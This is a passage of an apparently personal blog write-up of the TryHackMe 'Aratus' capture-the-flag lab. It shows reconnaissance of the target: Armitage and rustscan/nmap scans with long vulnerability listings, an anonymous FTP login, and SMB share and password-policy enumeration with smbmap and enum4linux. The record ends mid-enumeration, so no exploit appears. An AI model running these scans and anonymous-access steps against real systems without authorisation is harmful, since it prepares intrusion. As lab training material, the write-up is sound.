@@ -1,0 +1,1937 @@
+---
+title: 'CTF - TryHackMe: Aratus'
+description: ""
+published: 2023-08-05
+redirect_from: 
+            - http://salucci.ch/?p=1259
+categories: ["TryHackMe, CTF"]
+hero: ./img/wp-content-uploads-2023-08-target-aratus.png
+---
+### Level: **_Medium_**
+
+#### Introduction
+
+Perform a penetration test against a vulnerable machine. Your end-goal is to become the root user and retrieve the two flags:
+
+- /home/`{`{`user`}`}`/user.txt
+- /root/root.txt
+
+The flags are always in the same format, where XYZ is a MD5 hash: THM`{XYZ}`
+
+Thanks to **[Biniru](https://tryhackme.com/p/Biniru) **for the room on TryHackMe!
+
+---
+
+#### Table of Content
+
+---
+
+#### RECONNAISSANCE
+
+##### ARMITAGE C2 FRAMEWORK
+
+```sh
+sudo teamserver YOUR-TRYHACKME-IP s3cr3t
+sudo armitage
+```
+
+```
+<strong>Hosts > Nmap Scan > Quick Scan (OS detect)</strong>
+
+[*] Nmap: PORT    STATE SERVICE     VERSION
+[*] Nmap: 21/tcp  open  ftp         vsftpd 3.0.2
+[*] Nmap: 22/tcp  open  ssh         OpenSSH 7.4 (protocol 2.0)
+[*] Nmap: 80/tcp  open  http        Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips)
+[*] Nmap: 139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+[*] Nmap: 443/tcp open  ssl/http    Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips)
+[*] Nmap: 445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+```
+
+![Target Aratus](./img/wp-content-uploads-2023-08-target-aratus.png)
+
+##### RUSTSCAN
+
+```
+<strong>sudo rustscan -a 10.10.202.203 --ulimit 5000 -- -oA scans/ -sC -sV --script vuln,mysql-enum</strong>
+```
+
+```
+Open 10.10.130.167:<strong>21</strong>
+Open 10.10.130.167:<strong>22</strong>
+Open 10.10.130.167:<strong>80</strong>
+Open 10.10.130.167:<strong>139</strong>
+Open 10.10.130.167:<strong>443</strong>
+Open 10.10.130.167:<strong>445</strong>
+```
+
+
+
+
+
+---
+
+
+
+
+
+##### PORT 21 / FTP
+
+
+
+
+
+```
+<strong>21/tcp  open  ftp</strong>         syn-ack ttl 63 <strong>vsftpd 3.0.2</strong>
+```
+
+
+
+
+
+```
+> Let's Pentest FTP maybe anonymous access is open.
+
+<strong>ftp 10.10.130.167</strong>
+
+Connected to 10.10.130.167.
+220 (vsFTPd 3.0.2)
+Name (10.10.130.167:anyguy): <strong>anonymous</strong>
+331 Please specify the password.
+Password: <strong>anonymous</strong>
+<strong><em>230 Login successful.</em></strong>
+Remote system type is UNIX.
+Using binary mode to transfer files.
+```
+
+
+
+
+
+```
+> Hello, let's list the directories
+
+ftp> <strong>dir</strong>
+
+229 Entering Extended Passive Mode (|||44892|).
+150 Here comes the directory listing.
+<strong>drwxr-xr-x    2 0        0               6 Jun 09  2021 pub</strong>
+226 Directory send OK.
+
+ftp> <strong>cd pub</strong>
+
+250 Directory successfully changed.
+
+<strong>ftp> dir</strong>
+
+229 Entering Extended Passive Mode (|||21649|).
+150 Here comes the directory listing.
+226 Directory send OK.
+```
+
+
+
+
+
+```
+> Seems to be empty, maybee we can use this later to upload something..
+
+> Maybee a <strong><em>revsHELL</em></strong>
+```
+
+
+
+
+
+##### PORT 22 / SSH
+
+
+
+
+
+```
+<strong>22/tcp  open  ssh</strong>         syn-ack ttl 63 <strong>OpenSSH 7.4</strong> (protocol 2.0)
+| vulners:
+|   cpe:/a:openbsd:openssh:7.4:
+|       EXPLOITPACK:98FE96309F9524B8C84C508837551A19    5.8     https://vulners.com/exploitpack/EXPLOITPACK:98FE96309F9524B8C84C508837551A19    *EXPLOIT*
+|       EXPLOITPACK:5330EA02EBDE345BFC9D6DDDD97F9E97    5.8     https://vulners.com/exploitpack/EXPLOITPACK:5330EA02EBDE345BFC9D6DDDD97F9E97    *EXPLOIT*
+|       EDB-ID:46516    5.8     https://vulners.com/exploitdb/EDB-ID:46516      *EXPLOIT*
+|       EDB-ID:46193    5.8     https://vulners.com/exploitdb/EDB-ID:46193      *EXPLOIT*
+|       CVE-2019-6111   5.8     https://vulners.com/cve/CVE-2019-6111
+|       1337DAY-ID-32328        5.8     https://vulners.com/zdt/1337DAY-ID-32328        *EXPLOIT*
+|       1337DAY-ID-32009        5.8     https://vulners.com/zdt/1337DAY-ID-32009        *EXPLOIT*
+|       SSH_ENUM        5.0     https://vulners.com/canvas/SSH_ENUM     *EXPLOIT*
+|       PACKETSTORM:150621      5.0     https://vulners.com/packetstorm/PACKETSTORM:150621      *EXPLOIT*
+|       EXPLOITPACK:F957D7E8A0CC1E23C3C649B764E13FB0    5.0     https://vulners.com/exploitpack/EXPLOITPACK:F957D7E8A0CC1E23C3C649B764E13FB0    *EXPLOIT*
+|       EXPLOITPACK:EBDBC5685E3276D648B4D14B75563283    5.0     https://vulners.com/exploitpack/EXPLOITPACK:EBDBC5685E3276D648B4D14B75563283    *EXPLOIT*
+|       EDB-ID:45939    5.0     https://vulners.com/exploitdb/EDB-ID:45939      *EXPLOIT*
+|       EDB-ID:45233    5.0     https://vulners.com/exploitdb/EDB-ID:45233      *EXPLOIT*
+|       CVE-2018-15919  5.0     https://vulners.com/cve/CVE-2018-15919
+|       CVE-2018-15473  5.0     https://vulners.com/cve/CVE-2018-15473
+|       CVE-2017-15906  5.0     https://vulners.com/cve/CVE-2017-15906
+|       CVE-2016-10708  5.0     https://vulners.com/cve/CVE-2016-10708
+|       1337DAY-ID-31730        5.0     https://vulners.com/zdt/1337DAY-ID-31730        *EXPLOIT*
+|       CVE-2021-41617  4.4     https://vulners.com/cve/CVE-2021-41617
+|       CVE-2020-14145  4.3     https://vulners.com/cve/CVE-2020-14145
+|       CVE-2019-6110   4.0     https://vulners.com/cve/CVE-2019-6110
+|       CVE-2019-6109   4.0     https://vulners.com/cve/CVE-2019-6109
+|       CVE-2018-20685  2.6     https://vulners.com/cve/CVE-2018-20685
+|       PACKETSTORM:151227      0.0     https://vulners.com/packetstorm/PACKETSTORM:151227      *EXPLOIT*
+|       MSF:AUXILIARY-SCANNER-SSH-SSH_ENUMUSERS-        0.0     https://vulners.com/metasploit/MSF:AUXILIARY-SCANNER-SSH-SSH_ENUMUSERS- *EXPLOIT*
+|_      1337DAY-ID-30937        0.0     https://vulners.com/zdt/1337DAY-ID-30937        *EXPLOIT*
+```
+
+
+
+
+
+##### PORT 80 / HTTP
+
+
+
+
+
+```
+<strong>80/tcp  open  http</strong>        syn-ack ttl 63 <strong>Apache httpd 2.4.6</strong> ((<strong>CentOS</strong>) OpenSSL/1.0.2k-fips)
+|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips
+|_http-dombased-xss: Couldn't find any DOM based XSS.
+|_http-litespeed-sourcecode-download: Request with null byte did not work. This web server might not be vulnerable
+|_http-wordpress-users: [Error] Wordpress installation was not found. We couldn't find wp-login.php
+| http-trace: TRACE is enabled
+| Headers:
+| Date: Fri, 04 Aug 2023 19:45:24 GMT
+| Server: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips
+| Connection: close
+| Transfer-Encoding: chunked
+|_Content-Type: message/http
+| vulners:
+|   cpe:/a:apache:http_server:2.4.6:
+|       PACKETSTORM:171631      7.5     https://vulners.com/packetstorm/PACKETSTORM:171631      *EXPLOIT*
+|       EDB-ID:51193    7.5     https://vulners.com/exploitdb/EDB-ID:51193      *EXPLOIT*
+|       CVE-2023-25690  7.5     https://vulners.com/cve/CVE-2023-25690
+|       CVE-2022-31813  7.5     https://vulners.com/cve/CVE-2022-31813
+|       CVE-2022-23943  7.5     https://vulners.com/cve/CVE-2022-23943
+|       CVE-2022-22720  7.5     https://vulners.com/cve/CVE-2022-22720
+|       CVE-2021-44790  7.5     https://vulners.com/cve/CVE-2021-44790
+|       CVE-2021-39275  7.5     https://vulners.com/cve/CVE-2021-39275
+|       CVE-2021-26691  7.5     https://vulners.com/cve/CVE-2021-26691
+|       CVE-2017-7679   7.5     https://vulners.com/cve/CVE-2017-7679
+|       CVE-2017-3167   7.5     https://vulners.com/cve/CVE-2017-3167
+|       CNVD-2022-73123 7.5     https://vulners.com/cnvd/CNVD-2022-73123
+|       CNVD-2022-03225 7.5     https://vulners.com/cnvd/CNVD-2022-03225
+|       CNVD-2021-102386        7.5     https://vulners.com/cnvd/CNVD-2021-102386
+|       5C1BB960-90C1-5EBF-9BEF-F58BFFDFEED9    7.5     https://vulners.com/githubexploit/5C1BB960-90C1-5EBF-9BEF-F58BFFDFEED9  *EXPLOIT*
+|       1337DAY-ID-38427        7.5     https://vulners.com/zdt/1337DAY-ID-38427        *EXPLOIT*
+|       PACKETSTORM:127546      6.8     https://vulners.com/packetstorm/PACKETSTORM:127546      *EXPLOIT*
+|       FDF3DFA1-ED74-5EE2-BF5C-BA752CA34AE8    6.8     https://vulners.com/githubexploit/FDF3DFA1-ED74-5EE2-BF5C-BA752CA34AE8  *EXPLOIT*
+|       CVE-2021-40438  6.8     https://vulners.com/cve/CVE-2021-40438
+|       CVE-2020-35452  6.8     https://vulners.com/cve/CVE-2020-35452
+|       CVE-2018-1312   6.8     https://vulners.com/cve/CVE-2018-1312
+|       CVE-2017-15715  6.8     https://vulners.com/cve/CVE-2017-15715
+|       CVE-2016-5387   6.8     https://vulners.com/cve/CVE-2016-5387
+|       CVE-2014-0226   6.8     https://vulners.com/cve/CVE-2014-0226
+|       CNVD-2022-03224 6.8     https://vulners.com/cnvd/CNVD-2022-03224
+|       8AFB43C5-ABD4-52AD-BB19-24D7884FF2A2    6.8     https://vulners.com/githubexploit/8AFB43C5-ABD4-52AD-BB19-24D7884FF2A2  *EXPLOIT*
+|       4810E2D9-AC5F-5B08-BFB3-DDAFA2F63332    6.8     https://vulners.com/githubexploit/4810E2D9-AC5F-5B08-BFB3-DDAFA2F63332  *EXPLOIT*
+|       4373C92A-2755-5538-9C91-0469C995AA9B    6.8     https://vulners.com/githubexploit/4373C92A-2755-5538-9C91-0469C995AA9B  *EXPLOIT*
+|       1337DAY-ID-22451        6.8     https://vulners.com/zdt/1337DAY-ID-22451        *EXPLOIT*
+|       0095E929-7573-5E4A-A7FA-F6598A35E8DE    6.8     https://vulners.com/githubexploit/0095E929-7573-5E4A-A7FA-F6598A35E8DE  *EXPLOIT*
+|       CVE-2022-28615  6.4     https://vulners.com/cve/CVE-2022-28615
+|       CVE-2017-9788   6.4     https://vulners.com/cve/CVE-2017-9788
+|       CVE-2019-0217   6.0     https://vulners.com/cve/CVE-2019-0217
+|       CVE-2022-22721  5.8     https://vulners.com/cve/CVE-2022-22721
+|       CVE-2020-1927   5.8     https://vulners.com/cve/CVE-2020-1927
+|       CVE-2019-10098  5.8     https://vulners.com/cve/CVE-2019-10098
+|       1337DAY-ID-33577        5.8     https://vulners.com/zdt/1337DAY-ID-33577        *EXPLOIT*
+|       CVE-2022-36760  5.1     https://vulners.com/cve/CVE-2022-36760
+|       SSV:96537       5.0     https://vulners.com/seebug/SSV:96537    *EXPLOIT*
+|       SSV:62058       5.0     https://vulners.com/seebug/SSV:62058    *EXPLOIT*
+|       SSV:61874       5.0     https://vulners.com/seebug/SSV:61874    *EXPLOIT*
+|       EXPLOITPACK:DAED9B9E8D259B28BF72FC7FDC4755A7    5.0     https://vulners.com/exploitpack/EXPLOITPACK:DAED9B9E8D259B28BF72FC7FDC4755A7    *EXPLOIT*
+|       EXPLOITPACK:C8C256BE0BFF5FE1C0405CB0AA9C075D    5.0     https://vulners.com/exploitpack/EXPLOITPACK:C8C256BE0BFF5FE1C0405CB0AA9C075D    *EXPLOIT*
+|       EDB-ID:42745    5.0     https://vulners.com/exploitdb/EDB-ID:42745      *EXPLOIT*
+|       EDB-ID:40961    5.0     https://vulners.com/exploitdb/EDB-ID:40961      *EXPLOIT*
+|       CVE-2022-37436  5.0     https://vulners.com/cve/CVE-2022-37436
+|       CVE-2022-30556  5.0     https://vulners.com/cve/CVE-2022-30556
+|       CVE-2022-29404  5.0     https://vulners.com/cve/CVE-2022-29404
+|       CVE-2022-28614  5.0     https://vulners.com/cve/CVE-2022-28614
+|       CVE-2022-26377  5.0     https://vulners.com/cve/CVE-2022-26377
+|       CVE-2022-22719  5.0     https://vulners.com/cve/CVE-2022-22719
+|       CVE-2021-34798  5.0     https://vulners.com/cve/CVE-2021-34798
+|       CVE-2021-26690  5.0     https://vulners.com/cve/CVE-2021-26690
+|       CVE-2020-1934   5.0     https://vulners.com/cve/CVE-2020-1934
+|       CVE-2019-17567  5.0     https://vulners.com/cve/CVE-2019-17567
+|       CVE-2019-0220   5.0     https://vulners.com/cve/CVE-2019-0220
+|       CVE-2018-17199  5.0     https://vulners.com/cve/CVE-2018-17199
+|       CVE-2018-1303   5.0     https://vulners.com/cve/CVE-2018-1303
+|       CVE-2017-9798   5.0     https://vulners.com/cve/CVE-2017-9798
+|       CVE-2017-15710  5.0     https://vulners.com/cve/CVE-2017-15710
+|       CVE-2016-8743   5.0     https://vulners.com/cve/CVE-2016-8743
+|       CVE-2016-2161   5.0     https://vulners.com/cve/CVE-2016-2161
+|       CVE-2016-0736   5.0     https://vulners.com/cve/CVE-2016-0736
+|       CVE-2015-3183   5.0     https://vulners.com/cve/CVE-2015-3183
+|       CVE-2015-0228   5.0     https://vulners.com/cve/CVE-2015-0228
+|       CVE-2014-3581   5.0     https://vulners.com/cve/CVE-2014-3581
+|       CVE-2014-0231   5.0     https://vulners.com/cve/CVE-2014-0231
+|       CVE-2014-0098   5.0     https://vulners.com/cve/CVE-2014-0098
+|       CVE-2013-6438   5.0     https://vulners.com/cve/CVE-2013-6438
+|       CVE-2013-5704   5.0     https://vulners.com/cve/CVE-2013-5704
+|       CVE-2006-20001  5.0     https://vulners.com/cve/CVE-2006-20001
+|       CNVD-2022-73122 5.0     https://vulners.com/cnvd/CNVD-2022-73122
+|       CNVD-2022-53584 5.0     https://vulners.com/cnvd/CNVD-2022-53584
+|       CNVD-2022-53582 5.0     https://vulners.com/cnvd/CNVD-2022-53582
+|       CNVD-2022-03223 5.0     https://vulners.com/cnvd/CNVD-2022-03223
+|       1337DAY-ID-28573        5.0     https://vulners.com/zdt/1337DAY-ID-28573        *EXPLOIT*
+|       1337DAY-ID-26574        5.0     https://vulners.com/zdt/1337DAY-ID-26574        *EXPLOIT*
+|       SSV:87152       4.3     https://vulners.com/seebug/SSV:87152    *EXPLOIT*
+|       PACKETSTORM:127563      4.3     https://vulners.com/packetstorm/PACKETSTORM:127563      *EXPLOIT*
+|       CVE-2020-11985  4.3     https://vulners.com/cve/CVE-2020-11985
+|       CVE-2019-10092  4.3     https://vulners.com/cve/CVE-2019-10092
+|       CVE-2018-1302   4.3     https://vulners.com/cve/CVE-2018-1302
+|       CVE-2018-1301   4.3     https://vulners.com/cve/CVE-2018-1301
+|       CVE-2016-4975   4.3     https://vulners.com/cve/CVE-2016-4975
+|       CVE-2015-3185   4.3     https://vulners.com/cve/CVE-2015-3185
+|       CVE-2014-8109   4.3     https://vulners.com/cve/CVE-2014-8109
+|       CVE-2014-0118   4.3     https://vulners.com/cve/CVE-2014-0118
+|       CVE-2014-0117   4.3     https://vulners.com/cve/CVE-2014-0117
+|       CVE-2013-4352   4.3     https://vulners.com/cve/CVE-2013-4352
+|       CVE-2013-1896   4.3     https://vulners.com/cve/CVE-2013-1896
+|       4013EC74-B3C1-5D95-938A-54197A58586D    4.3     https://vulners.com/githubexploit/4013EC74-B3C1-5D95-938A-54197A58586D  *EXPLOIT*
+|       1337DAY-ID-33575        4.3     https://vulners.com/zdt/1337DAY-ID-33575        *EXPLOIT*
+|       CVE-2018-1283   3.5     https://vulners.com/cve/CVE-2018-1283
+|       CVE-2016-8612   3.3     https://vulners.com/cve/CVE-2016-8612
+|_      PACKETSTORM:140265      0.0     https://vulners.com/packetstorm/PACKETSTORM:140265      *EXPLOIT*
+|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
+|_http-csrf: Couldn't find any CSRF vulnerabilities.
+|_http-jsonp-detection: Couldn't find any JSONP endpoints.
+| http-enum:
+|_  <strong>/icons/: Potentially interesting</strong> folder w/ directory listing
+```
+
+
+
+
+
+##### PORT 139 / SAMBA SMB
+
+
+
+
+
+```
+<strong>139/tcp open  netbios-ssn</strong> syn-ack ttl 63 <strong>Samba smbd 3.X - 4.X</strong> (workgroup: <strong>WORKGROUP</strong>)
+```
+
+
+
+
+
+##### PORT 443 / HTTPS
+
+
+
+
+
+```
+<strong>443/tcp open  ssl/http</strong>    syn-ack ttl 63 <strong>Apache httpd 2.4.6</strong> ((<strong>CentOS</strong>) OpenSSL/1.0.2k-fips)
+| http-trace: TRACE is enabled
+| Headers:
+| Date: Fri, 04 Aug 2023 19:45:24 GMT
+| Server: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips
+| Connection: close
+| Transfer-Encoding: chunked
+|_Content-Type: message/http
+|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips
+| http-enum:
+|_  <strong>/icons/: Potentially interesting</strong> folder w/ directory listing
+|_http-litespeed-sourcecode-download: Request with null byte did not work. This web server might not be vulnerable
+|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
+|_http-dombased-xss: Couldn't find any DOM based XSS.
+|_http-jsonp-detection: Couldn't find any JSONP endpoints.
+|_http-csrf: Couldn't find any CSRF vulnerabilities.
+| vulners:
+|   cpe:/a:apache:http_server:2.4.6:
+|       PACKETSTORM:171631      7.5     https://vulners.com/packetstorm/PACKETSTORM:171631      *EXPLOIT*
+|       EDB-ID:51193    7.5     https://vulners.com/exploitdb/EDB-ID:51193      *EXPLOIT*
+|       CVE-2023-25690  7.5     https://vulners.com/cve/CVE-2023-25690
+|       CVE-2022-31813  7.5     https://vulners.com/cve/CVE-2022-31813
+|       CVE-2022-23943  7.5     https://vulners.com/cve/CVE-2022-23943
+|       CVE-2022-22720  7.5     https://vulners.com/cve/CVE-2022-22720
+|       CVE-2021-44790  7.5     https://vulners.com/cve/CVE-2021-44790
+|       CVE-2021-39275  7.5     https://vulners.com/cve/CVE-2021-39275
+|       CVE-2021-26691  7.5     https://vulners.com/cve/CVE-2021-26691
+|       CVE-2017-7679   7.5     https://vulners.com/cve/CVE-2017-7679
+|       CVE-2017-3167   7.5     https://vulners.com/cve/CVE-2017-3167
+|       CNVD-2022-73123 7.5     https://vulners.com/cnvd/CNVD-2022-73123
+|       CNVD-2022-03225 7.5     https://vulners.com/cnvd/CNVD-2022-03225
+|       CNVD-2021-102386        7.5     https://vulners.com/cnvd/CNVD-2021-102386
+|       5C1BB960-90C1-5EBF-9BEF-F58BFFDFEED9    7.5     https://vulners.com/githubexploit/5C1BB960-90C1-5EBF-9BEF-F58BFFDFEED9  *EXPLOIT*
+|       1337DAY-ID-38427        7.5     https://vulners.com/zdt/1337DAY-ID-38427        *EXPLOIT*
+|       PACKETSTORM:127546      6.8     https://vulners.com/packetstorm/PACKETSTORM:127546      *EXPLOIT*
+|       FDF3DFA1-ED74-5EE2-BF5C-BA752CA34AE8    6.8     https://vulners.com/githubexploit/FDF3DFA1-ED74-5EE2-BF5C-BA752CA34AE8  *EXPLOIT*
+|       CVE-2021-40438  6.8     https://vulners.com/cve/CVE-2021-40438
+|       CVE-2020-35452  6.8     https://vulners.com/cve/CVE-2020-35452
+|       CVE-2018-1312   6.8     https://vulners.com/cve/CVE-2018-1312
+|       CVE-2017-15715  6.8     https://vulners.com/cve/CVE-2017-15715
+|       CVE-2016-5387   6.8     https://vulners.com/cve/CVE-2016-5387
+|       CVE-2014-0226   6.8     https://vulners.com/cve/CVE-2014-0226
+|       CNVD-2022-03224 6.8     https://vulners.com/cnvd/CNVD-2022-03224
+|       8AFB43C5-ABD4-52AD-BB19-24D7884FF2A2    6.8     https://vulners.com/githubexploit/8AFB43C5-ABD4-52AD-BB19-24D7884FF2A2  *EXPLOIT*
+|       4810E2D9-AC5F-5B08-BFB3-DDAFA2F63332    6.8     https://vulners.com/githubexploit/4810E2D9-AC5F-5B08-BFB3-DDAFA2F63332  *EXPLOIT*
+|       4373C92A-2755-5538-9C91-0469C995AA9B    6.8     https://vulners.com/githubexploit/4373C92A-2755-5538-9C91-0469C995AA9B  *EXPLOIT*
+|       1337DAY-ID-22451        6.8     https://vulners.com/zdt/1337DAY-ID-22451        *EXPLOIT*
+|       0095E929-7573-5E4A-A7FA-F6598A35E8DE    6.8     https://vulners.com/githubexploit/0095E929-7573-5E4A-A7FA-F6598A35E8DE  *EXPLOIT*
+|       CVE-2022-28615  6.4     https://vulners.com/cve/CVE-2022-28615
+|       CVE-2017-9788   6.4     https://vulners.com/cve/CVE-2017-9788
+|       CVE-2019-0217   6.0     https://vulners.com/cve/CVE-2019-0217
+|       CVE-2022-22721  5.8     https://vulners.com/cve/CVE-2022-22721
+|       CVE-2020-1927   5.8     https://vulners.com/cve/CVE-2020-1927
+|       CVE-2019-10098  5.8     https://vulners.com/cve/CVE-2019-10098
+|       1337DAY-ID-33577        5.8     https://vulners.com/zdt/1337DAY-ID-33577        *EXPLOIT*
+|       CVE-2022-36760  5.1     https://vulners.com/cve/CVE-2022-36760
+|       SSV:96537       5.0     https://vulners.com/seebug/SSV:96537    *EXPLOIT*
+|       SSV:62058       5.0     https://vulners.com/seebug/SSV:62058    *EXPLOIT*
+|       SSV:61874       5.0     https://vulners.com/seebug/SSV:61874    *EXPLOIT*
+|       EXPLOITPACK:DAED9B9E8D259B28BF72FC7FDC4755A7    5.0     https://vulners.com/exploitpack/EXPLOITPACK:DAED9B9E8D259B28BF72FC7FDC4755A7    *EXPLOIT*
+|       EXPLOITPACK:C8C256BE0BFF5FE1C0405CB0AA9C075D    5.0     https://vulners.com/exploitpack/EXPLOITPACK:C8C256BE0BFF5FE1C0405CB0AA9C075D    *EXPLOIT*
+|       EDB-ID:42745    5.0     https://vulners.com/exploitdb/EDB-ID:42745      *EXPLOIT*
+|       EDB-ID:40961    5.0     https://vulners.com/exploitdb/EDB-ID:40961      *EXPLOIT*
+|       CVE-2022-37436  5.0     https://vulners.com/cve/CVE-2022-37436
+|       CVE-2022-30556  5.0     https://vulners.com/cve/CVE-2022-30556
+|       CVE-2022-29404  5.0     https://vulners.com/cve/CVE-2022-29404
+|       CVE-2022-28614  5.0     https://vulners.com/cve/CVE-2022-28614
+|       CVE-2022-26377  5.0     https://vulners.com/cve/CVE-2022-26377
+|       CVE-2022-22719  5.0     https://vulners.com/cve/CVE-2022-22719
+|       CVE-2021-34798  5.0     https://vulners.com/cve/CVE-2021-34798
+|       CVE-2021-26690  5.0     https://vulners.com/cve/CVE-2021-26690
+|       CVE-2020-1934   5.0     https://vulners.com/cve/CVE-2020-1934
+|       CVE-2019-17567  5.0     https://vulners.com/cve/CVE-2019-17567
+|       CVE-2019-0220   5.0     https://vulners.com/cve/CVE-2019-0220
+|       CVE-2018-17199  5.0     https://vulners.com/cve/CVE-2018-17199
+|       CVE-2018-1303   5.0     https://vulners.com/cve/CVE-2018-1303
+|       CVE-2017-9798   5.0     https://vulners.com/cve/CVE-2017-9798
+|       CVE-2017-15710  5.0     https://vulners.com/cve/CVE-2017-15710
+|       CVE-2016-8743   5.0     https://vulners.com/cve/CVE-2016-8743
+|       CVE-2016-2161   5.0     https://vulners.com/cve/CVE-2016-2161
+|       CVE-2016-0736   5.0     https://vulners.com/cve/CVE-2016-0736
+|       CVE-2015-3183   5.0     https://vulners.com/cve/CVE-2015-3183
+|       CVE-2015-0228   5.0     https://vulners.com/cve/CVE-2015-0228
+|       CVE-2014-3581   5.0     https://vulners.com/cve/CVE-2014-3581
+|       CVE-2014-0231   5.0     https://vulners.com/cve/CVE-2014-0231
+|       CVE-2014-0098   5.0     https://vulners.com/cve/CVE-2014-0098
+|       CVE-2013-6438   5.0     https://vulners.com/cve/CVE-2013-6438
+|       CVE-2013-5704   5.0     https://vulners.com/cve/CVE-2013-5704
+|       CVE-2006-20001  5.0     https://vulners.com/cve/CVE-2006-20001
+|       CNVD-2022-73122 5.0     https://vulners.com/cnvd/CNVD-2022-73122
+|       CNVD-2022-53584 5.0     https://vulners.com/cnvd/CNVD-2022-53584
+|       CNVD-2022-53582 5.0     https://vulners.com/cnvd/CNVD-2022-53582
+|       CNVD-2022-03223 5.0     https://vulners.com/cnvd/CNVD-2022-03223
+|       1337DAY-ID-28573        5.0     https://vulners.com/zdt/1337DAY-ID-28573        *EXPLOIT*
+|       1337DAY-ID-26574        5.0     https://vulners.com/zdt/1337DAY-ID-26574        *EXPLOIT*
+|       SSV:87152       4.3     https://vulners.com/seebug/SSV:87152    *EXPLOIT*
+|       PACKETSTORM:127563      4.3     https://vulners.com/packetstorm/PACKETSTORM:127563      *EXPLOIT*
+|       CVE-2020-11985  4.3     https://vulners.com/cve/CVE-2020-11985
+|       CVE-2019-10092  4.3     https://vulners.com/cve/CVE-2019-10092
+|       CVE-2018-1302   4.3     https://vulners.com/cve/CVE-2018-1302
+|       CVE-2018-1301   4.3     https://vulners.com/cve/CVE-2018-1301
+|       CVE-2016-4975   4.3     https://vulners.com/cve/CVE-2016-4975
+|       CVE-2015-3185   4.3     https://vulners.com/cve/CVE-2015-3185
+|       CVE-2014-8109   4.3     https://vulners.com/cve/CVE-2014-8109
+|       CVE-2014-0118   4.3     https://vulners.com/cve/CVE-2014-0118
+|       CVE-2014-0117   4.3     https://vulners.com/cve/CVE-2014-0117
+|       CVE-2013-4352   4.3     https://vulners.com/cve/CVE-2013-4352
+|       CVE-2013-1896   4.3     https://vulners.com/cve/CVE-2013-1896
+|       4013EC74-B3C1-5D95-938A-54197A58586D    4.3     https://vulners.com/githubexploit/4013EC74-B3C1-5D95-938A-54197A58586D  *EXPLOIT*
+|       1337DAY-ID-33575        4.3     https://vulners.com/zdt/1337DAY-ID-33575        *EXPLOIT*
+|       CVE-2018-1283   3.5     https://vulners.com/cve/CVE-2018-1283
+|       CVE-2016-8612   3.3     https://vulners.com/cve/CVE-2016-8612
+|_      PACKETSTORM:140265      0.0     https://vulners.com/packetstorm/PACKETSTORM:140265      *EXPLOIT*
+|_http-wordpress-users: [Error] Wordpress installation was not found. We couldn't find wp-login.php
+```
+
+
+
+
+
+##### PORT 445 / SAMBA SMB
+
+
+
+
+
+```
+<strong>445/tcp open  netbios-ssn</strong> syn-ack ttl 63 <strong>Samba smbd 3.X - 4.X</strong> (workgroup: <strong>WORKGROUP</strong>)
+Service Info: Host: ARATUS; OS: Unix
+
+Host script results:
+| smb-vuln-regsvc-dos:
+|   VULNERABLE:
+|   Service regsvc in Microsoft Windows systems vulnerable to denial of service
+|     State: VULNERABLE
+|       The service regsvc in Microsoft Windows 2000 systems is vulnerable to denial of service caused by a null deference
+|       pointer. This script will crash the service if it is vulnerable. This vulnerability was discovered by Ron Bowes
+|       while working on smb-enum-sessions.
+|_
+|_smb-vuln-ms10-061: false
+|_smb-vuln-ms10-054: false
+```
+
+
+
+
+
+```
+> Let's Pentest SMB
+
+<strong>smbmap -H 10.10.130.167</strong>
+
+[+] IP: 10.10.130.167:445       Name: 10.10.130.167
+        Disk                                                    Permissions     Comment
+        ----                                                    -----------     -------
+        print$                                                  NO ACCESS       Printer Drivers
+        <strong>temporary share                                         READ ONLY</strong>
+        IPC$                                                    NO ACCESS       IPC Service (Samba 4.10.16)
+```
+
+
+
+
+
+```
+> Found a <strong><em>temporary share</em></strong> with read access
+> Let's go a little deeper
+```
+
+
+
+
+
+```
+<strong>enum4linux -a 10.10.130.167</strong>
+
+================================( Getting domain SID for 10.10.130.167 )================================
+
+<strong>Domain Name: WORKGROUP </strong>
+Domain Sid: (NULL SID)
+
+==================================( OS information on 10.10.130.167 )==================================
+
+
+[E] Can't get OS info with smbclient
+
+
+[+] Got OS info for 10.10.130.167 from srvinfo:
+        ARATUS         Wk Sv PrQ Unx NT SNT S<strong>amba 4.10.16</strong>
+        platform_id     :       500
+        os version      :       6.1
+        server type     :       0x809a03
+
+ =================================( Share Enumeration on 10.10.130.167 )=================================
+
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        print$          Disk      Printer Drivers
+        <strong>temporary share Disk</strong>
+        IPC$            IPC       IPC Service (Samba 4.10.16)
+SMB1 disabled -- no workgroup available
+
+[+] Attempting to map shares on 10.10.130.167
+
+//10.10.130.167/print$  Mapping: DENIED Listing: N/A Writing: N/A
+<strong>//10.10.130.167/temporary share Mapping: OK Listing: OK Writing: N/A</strong>
+
+[E] Can't understand response:
+
+NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*
+//10.10.130.167/IPC$    Mapping: N/A Listing: N/A Writing: N/A
+
+===========================( Password Policy Information for 10.10.130.167 )===========================
+
+
+
+[+] Attaching to 10.10.130.167 using a NULL share
+
+[+] Trying protocol 139/SMB...
+
+<strong>[+] Found domain(s):
+
+        [+] ARATUS</strong>
+        [+] Builtin
+
+<strong>[+] Password Info for Domain: ARATUS</strong>
+
+        [+] Minimum password length: 5
+        [+] Password history length: None
+        [+] Maximum password age: 37 days 6 hours 21 minutes
+        [+] Password Complexity Flags: 000000
+
+                [+] Domain Refuse Password Change: 0
+                [+] Domain Password Store Cleartext: 0
+                [+] Domain Password Lockout Admins: 0
+                [+] Domain Password No Clear Change: 0
+                [+] Domain Password No Anon Change: 0
+                [+] Domain Password Complex: 0
+
+        [+] Minimum password age: None
+        [+] Reset Account Lockout Counter: 30 minutes
+        [+] Locked Account Duration: 30 minutes
+        [+] Account Lockout Threshold: None
+        [+] Forced Log off Time: 37 days 6 hours 21 minutes
+
+
+
+[+] Retieved partial password policy with rpcclient:
+
+
+Password Complexity: Disabled
+Minimum Password Length: 5
+
